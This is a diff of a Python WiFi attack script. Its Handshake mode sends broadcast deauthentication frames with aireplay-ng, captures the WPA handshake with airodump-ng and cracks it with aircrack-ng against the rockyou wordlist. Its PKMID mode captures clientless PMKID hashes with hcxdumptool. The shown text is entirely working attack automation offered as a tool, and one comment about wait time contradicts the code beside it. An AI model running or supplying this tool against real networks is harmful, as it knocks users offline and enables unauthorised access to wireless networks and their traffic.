@@ -130,26 +130,22 @@ def attack_func(network_interface, attack_mode):
     # HandShake Attack Mode
     if attack_mode == "Handshake":
         subprocess.run(["sudo", "airmon-ng", "check", "kill"], stdout=subprocess.DEVNULL)
-        # subprocess.run(["killall", "dhclient", "wpa_supplicant"], stdout=subprocess.DEVNULL)
-        os.system(f"xterm -hold -e sudo airodump-ng {network_interface}mon &")
-        airodump_pid = subprocess.run(["pgrep", "xterm"], capture_output=True, text=True)
-        access_point_name = input(Fore.YELLOW + "Access point name: ")
-        access_point_channel = input(Fore.YELLOW + "Channel name: ")
-        if airodump_pid.stdout != "0":
-            os.system(f"sudo kill {airodump_pid.stdout}")
+        process = subprocess.Popen(["xterm", "-hold", "-e", "sudo", "airodump-ng", f"{network_interface}mon"])
+        # os.system(f"xterm -hold -e sudo airodump-ng {network_interface}mon &")
+        access_name = input(Fore.YELLOW + "Access point name: ")
+        access_channel = input(Fore.YELLOW + "Channel name: ")
         time.sleep(1)
-        os.system(
-            f"xterm -hold -e airodump-ng -c {access_point_channel} --write HandShake-Capture/Capture --essid {access_point_name} {network_interface}mon &")
-        time.sleep(4)
-        os.system(
-            f"xterm -hold -e aireplay-ng -0 12 -e {access_point_name} -c FF:FF:FF:FF:FF:FF {network_interface}mon &")
-        aireplay_pid = subprocess.run(["pgrep", "xterm"], capture_output=True, text=True)
-        time.sleep(40)
-        if aireplay_pid.stdout != "0":
-            os.system(f"sudo kill {aireplay_pid.stdout}")
-        time.sleep(4)
-        airodump_pid_handshake = subprocess.run(["pgrep", "xterm"], capture_output=True, text=True)
-        os.system(f"sudo kill {airodump_pid_handshake.stdout}")
+        get_colours("\n[*] Setting up things...", 'cyan')
+        try:
+            process.wait(timeout=2)  # Time for the process
+        except subprocess.TimeoutExpired:
+            process.kill()
+        get_current_path = subprocess.check_output('pwd').strip()
+        set_path = f'{get_current_path.decode()}/Capture'
+        os.system(f"xterm -hold -e sudo airodump-ng -c {access_channel} --essid {access_name} -w {set_path} {network_interface}mon &")
+        time.sleep(10)
+        os.system(f"xterm -hold -e aireplay-ng -0 35 -e {access_name} -c FF:FF:FF:FF:FF:FF {network_interface}mon")
+        time.sleep(10)  # Wait for 70 seconds for handshake.
         os.system("xterm -hold -e aircrack-ng -w /usr/share/wordlists/rockyou.txt HandShake-Capture/Capture-01.cap &")
     # PKMID Attack Mode
     elif attack_mode == "PKMID":
@@ -159,7 +155,8 @@ def attack_func(network_interface, attack_mode):
         get_colours("[*] Starting the PKMID Client-Less ATTACK", "magenta")
         time.sleep(3)
         get_colours("", "yellow")
-        process = subprocess.Popen(["sudo", "hcxdumptool", "-i" + network_interface + "mon", "--enable_status=1", "-o", "Capture_PKMID"])
+        process = subprocess.Popen(
+            ["sudo", "hcxdumptool", "-i" + network_interface + "mon", "--enable_status=1", "-o", "Capture_PKMID"])
         try:
             process.wait(timeout=70)  # Time for the process
         except subprocess.TimeoutExpired:
